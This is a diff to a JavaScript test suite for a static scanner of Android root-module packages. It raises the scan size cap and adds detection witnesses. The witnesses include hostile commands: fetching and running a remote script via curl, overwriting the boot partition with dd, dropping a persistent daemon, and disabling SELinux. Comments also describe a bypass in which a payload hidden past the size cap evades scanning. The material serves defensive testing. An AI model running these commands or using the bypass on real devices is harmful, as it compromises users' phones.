@@ -766,7 +766,10 @@ test('端到端：把 ELF 改名成 config.js 也只能落到「二进制」，�
 });
 
 test('端到端：payload 藏在行级规则输入上限之后 ⇒ 记账而不是免检（原「照样命中」用例，见下列注解）', () => {
-  const filler = '# 填充行，用于把危险语句推到报告内嵌上限之外\n'.repeat(1 + Math.ceil(MAX_TEXT / 60));
+  // 2026-11-19：单条目上限抬到 128 KB 之后，填充量必须跟着上限走（原来按 MAX_TEXT/60 猜行数），
+  // 否则「上限之外还留着一大段」这句话会悄悄不成立 —— 夹具自己按实际行长算够 11 倍上限。
+  const FILL29 = '# 填充行，用于把危险语句推到报告内嵌上限之外\n';
+  const filler = FILL29.repeat(1 + Math.ceil((CAP29 * 11) / Buffer.byteLength(FILL29)));
   const body = filler + '\nsetenforce 0\n';
   const p = writeZip('late-payload.zip', [
     { name: 'module.prop', content: CLEAN_PROP },
@@ -796,7 +799,7 @@ test('端到端：payload 藏在行级规则输入上限之后 ⇒ 记账而不�
   //   「没看全」的包怎么办 → 上架但标注覆盖不全 ⇒ 覆盖度不再等于拦截力。
   // 牙留着的地方：等级仍是 medium（截断记录照旧参与定级，不许塌成 low）、记录照旧指名条目与字节数、
   // 并且 AUDIT_COVERAGE_TRUNCATED 必须在 annotation.coverageGaps 里点名 —— 从「拦人」换成「不许静默」。
-  // ⚠ 这一改打开的格子要照实说：把载荷写到 24KB 上限之后，静态层读不到它，新模型下它就上架了。
+  // ⚠ 这一改打开的格子要照实说：把载荷写到单条目上限（2026-11-19 起 128 KB）之后，静态层读不到它，新模型下它就上架了。
   //   §0.2 拍的是接受这件事，§3 那条「分片进料做成一格真活」是它的前置任务，本轮没做。
   assertListedOutside(r, ['AUDIT_COVERAGE_TRUNCATED'], '载荷藏在行级规则输入上限之后：');
   assert.equal(r.annotation.coverageGaps.includes('AUDIT_COVERAGE_TRUNCATED'), true,
@@ -874,7 +877,7 @@ test('T2.9-②：载荷落在上限之后 ⇒ 记 AUDIT_COVERAGE_TRUNCATED，且
   // 留在用例里的牙：上限生效（SELINUX_DISABLE 不命中）、记账指名条目与两个字节数、等级不塌成 low、
   // 以及现在多出来的这一条 —— AUDIT_COVERAGE_TRUNCATED 必须进 annotation.coverageGaps，
   // 因为它是这一发被上架时**唯一带着的说法**。
-  // ⚠ 这条改动打开的格子要照实记：把载荷写到 24 KB 上限之后就脱离静态层。§0.2 那句
+  // ⚠ 这条改动打开的格子要照实记：把载荷写到单条目上限（128 KB）之后就脱离静态层。§0.2 那句
   //   「同时必须把分片进料做成一格真活」是它的前置任务，**不在本发范围内**。
   assertListedOutside(r, ['AUDIT_COVERAGE_TRUNCATED'], 'T2.9-②：');
 });
@@ -2737,6 +2740,12 @@ const ANCHOR_WITNESS = {
   WRITE_SYSTEM_VENDOR: { payload: 'cp "$MODPATH/busybox" /system/xbin/bb' },
   SELINUX_DISABLE: { payload: 'setenforce 0' },
   HOSTS_MODIFY: { payload: 'sed -i "s/^/#/" /system/etc/hosts' },
+  // 2026-11-19 新增五条：witness 取真包里出现过的形状；前缀形态（ANCHOR_PREFIX）仍须命中。
+  INLINE_REMOTE_EXEC: { payload: "sh -c \"$(curl -fsSL https://abc.cc/x)\"" },
+  RAW_BLOCK_WRITE: { payload: "dd if=/sdcard/x.img of=/dev/block/by-name/boot" },
+  PERSIST_DROP: { payload: "cp /data/local/tmp/daemon.sh /data/adb/service.d/daemon.sh" },
+  NET_REDIRECT: { payload: "iptables -t nat -A PREROUTING -p tcp -j REDIRECT --to-ports 8080" },
+  KERNEL_SYSCTL_WRITE: { payload: "echo 1 > /proc/sys/net/ipv4/ip_forward" },
   SELINUX_POLICY_RELAX: { payload: 'allow su * * { execute };' },
   SELINUX_TYPE_PERMISSIVE: { payload: 'typepermissive su;' },
   MAGISK_POLICY_LIVE: { payload: 'magiskpolicy --live "allow su * *"' },
@@ -5065,7 +5074,7 @@ const T4_SHAPE = {
   in851: t4edge(851, 1000),
   eq850: t4edge(850, 1000),
   out849: t4edge(849, 1000),
-  // 超限 polyglot：载荷整行落在 24 KB 之后（工单 §2.3 的有界通道就靠这一形记账）
+  // 超限 polyglot：载荷整行落在单条目上限之后（工单 §2.3 的有界通道就靠这一形记账）
   big: Buffer.concat([T4_ELF8,
     Buffer.from(pad29(LINES_BEFORE29 + 1) + 'setenforce 0\n' + pad29(60), 'utf8'),
     Buffer.alloc(64, 0)]),
@@ -5076,7 +5085,7 @@ const T4_SHA = {
   in851: '688e1044502a1c1abd241dacc47cf2260cd5be10',
   eq850: 'a2947b3711aa55a358d42e36a03bf02609f67e49',
   out849: '95995d4e122b4de1bf15e52f1cc9f9a5c6ad89c6',
-  big: 'c99f986e50128e6a8f2bc7b03c32a00e36288fa8',
+  big: 'de0fa79176925b7e036e533b1f5ad1df52857d4d',
   descDnd: '1dc90e16ccab657ff3739be50c26d8cfbccaccfe',
   descMusic: '9460f9e423c0a095bee139e1704782093d5ec038',
   fontSlice: 'e9b3cbfbb9a7794b9d5d1373694e7f5cc17ddec3',
@@ -5414,10 +5423,10 @@ test('T4-C2 不变量（工单 §2.1）：分桶契约一字未动 —— 没有
     '可撤销面仍是扩面之前那五个桶，一个都没多');
 });
 
-test('T4-C3 不变量（工单 §2.3）：polyglot 走的仍是 24 KB 有界通道，超限照旧记 AUDIT_COVERAGE_TRUNCATED', async () => {
+test('T4-C3 不变量（工单 §2.3）：polyglot 走的仍是单条目上限那条有界通道，超限照旧记 AUDIT_COVERAGE_TRUNCATED', async () => {
   assert.ok(T4_SHAPE.big.length > CAP29, `夹具必须超上限（${T4_SHAPE.big.length} / ${CAP29}）`);
   assert.equal(T4_SHA1(T4_SHAPE.big), T4_SHA.big, '夹具字节面钉住');
-  assert.equal(t4ratio(T4_SHAPE.big).toFixed(6), '0.997474');
+  assert.equal(t4ratio(T4_SHAPE.big).toFixed(6), '0.999484');
   const r = await t4pkg('eval.t4c3', 'assets/big.bin', T4_SHAPE.big);
   assert.ok(!r.findings.some((f) => f.ruleId === 'SELINUX_DISABLE'),
     '上限之后的载荷一行都不许多读（绕过有界通道直接喂全文 = 变异 M4，红在这一格）');
@@ -5432,7 +5441,7 @@ test('T4-C3 不变量（工单 §2.3）：polyglot 走的仍是 24 KB 有界通�
   assert.equal(t4fedRow(r, 'assets/big.bin').scanCapped, true);
   // ── 2026-10-21 换轴接线的直接后果（旧期望：`notEqual(action,'auto-approve')`）──────────
   // 依据 §0.2 原话「没看全的包怎么办 —— 上架但标注覆盖不全」，加 §5 的分档：这一发是
-  // `AUDIT_COVERAGE_TRUNCATED`（有界通道砍在 24 KB 上），属**没看全**那一档 ⇒ 上架并标注；
+  // `AUDIT_COVERAGE_TRUNCATED`（有界通道砍在单条目上限上），属**没看全**那一档 ⇒ 上架并标注；
   // §5 另一档「没跑成」（AI `failed`/`disabled`）仍不上架，那是分流那一步的 fail-closed 格，
   // 与这一发无关，两档不许并（本文件的证人另有其人：audit.yml 的 writeFailClosed 由
   // test/audit-triage.test.mjs 钉，这里没有翻它）。
@@ -6228,14 +6237,14 @@ test('T57-20 S3-A Step 5 呈现面一字不变：不命中任何新名字的包�
   // ── 2026-10-21 换轴接线的直接后果：这一格的 decision 基线**必须**重记 ────────────────
   // 上面两句才是这一发要证的「S3-A Step 5 呈现面一字不变」（它守的是 capabilityImports 那格进料
   // 换掉之后，findings 与 counts 逐字节不动）；旧那句 decision 字面量记的是**老轴**的判决
-  // （medium ⇒ block），而 §13.5 拍的是「上不上架只由 11 条名单 ∪ AI 恶意结论决定」。
+  // （medium ⇒ block），而 §13.5 拍的是「上不上架只由名单 ∪ AI 恶意结论决定」（名单 2026-11-19 加严后 13 条）。
   // `STRUCT_BINARY` 按 §3.2 ③ 归能力/覆盖轴 ⇒ 这个包名单外。下面这份字面量是 2026-10-21 在
   // 接线后的调用点上实测的（不是从老字面量推的）：字节面照旧的纪律不变，只是基线换了轴。
   // 有人把调用点退回老轴 ⇒ 这句红；有人偷偷让 STRUCT_BINARY 获得拦截力 ⇒ 上面 findings 的 sha
   // 不动而这一句红（判据那一格变了），两半各守各的，互不顶替。
   assert.deepEqual(r.decision, {
     action: 'auto-approve', label: 'auto-approved', needsHumanReview: false, axis: 'malice',
-    reason: '未命中上架拦截名单（名单共 11 条 armed / 11 条定案）—— 等级不再决定上不上架；'
+    reason: '未命中上架拦截名单（名单共 13 条 armed / 13 条定案）—— 等级不再决定上不上架；'
       + '风险等级 medium 在本模型里只是标注输入，不再拦上架',
   }, 'decision 站在新轴上：本轮之后它不再由等级决定；findings/counts 那两句才是 Step 5 的惰性证人');
   assert.ok(annOf(r).includes('STRUCT_BINARY'),
